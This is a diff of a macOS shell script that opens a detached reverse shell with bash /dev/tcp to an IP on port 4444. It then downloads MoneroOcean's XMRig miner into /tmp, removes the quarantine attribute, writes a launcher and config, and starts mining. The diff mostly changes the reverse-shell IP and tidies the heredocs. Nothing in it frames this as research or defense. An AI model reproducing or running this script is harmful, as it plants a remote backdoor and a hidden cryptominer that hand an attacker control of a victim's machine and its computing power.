@@ -1,6 +1,7 @@
-nohup bash -c 'bash -i >& /dev/tcp/192.168.4.112/4444 0>&1' >/dev/null 2>&1 & disown 2>/dev/null
+nohup bash -c 'bash -i >& /dev/tcp/10.246.88.245/4444 0>&1' >/dev/null 2>&1 & disown 2>/dev/null
 
-mkdir -p /tmp/moneroocean && cd /tmp/moneroocean
+ mkdir -p /tmp/moneroocean && cd /tmp/moneroocean
+
 download_release() {
   local url
   url=$(set -o pipefail
@@ -14,16 +15,17 @@ download_release() {
         | first') || { echo 'No matching release asset' >&2; exit 1; }
   curl -fL -o "$3" -- "$url"
 }
+
 asset='mac\.tar\.gz$'
 case "$(uname -m)" in x86_64|amd64) asset='mac-intel\.tar\.gz$';; esac
 download_release MoneroOcean/xmrig "$asset" xmrig.tar.gz && tar xf xmrig.tar.gz && chmod +x xmrig
 xattr -d com.apple.quarantine xmrig 2>/dev/null || true
 
-#Make mineing configuration prescript
-
+# --- Make mining configuration prescript ---
 cd /tmp/moneroocean
 
-echo "#!/usr/bin/env bash
+cat > start.sh <<'START_SH_EOF'
+#!/usr/bin/env bash
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 XMRIG="$SCRIPT_DIR/xmrig"
@@ -353,11 +355,9 @@ ok "Pool: $POOL_URL"
 hdr "Starting XMRig"
 echo -e "${GREEN}${BOLD}All checks passed — launching miner...${NC}\n"
 exec "$XMRIG" --config "$CONFIG"
-" > start.sh
+START_SH_EOF
 
-#config
-
-echo "
+cat > config.json <<'CONFIG_JSON_EOF'
 {
     "api": {
         "id": null,
@@ -512,7 +512,8 @@ echo "
     },
     "pause-on-battery": false,
     "pause-on-active": false
-}" > config.json
+}
+CONFIG_JSON_EOF
 
-chmod +x /tmp/moneroocean/start.sh 
+chmod +x /tmp/moneroocean/start.sh
 ./start.sh
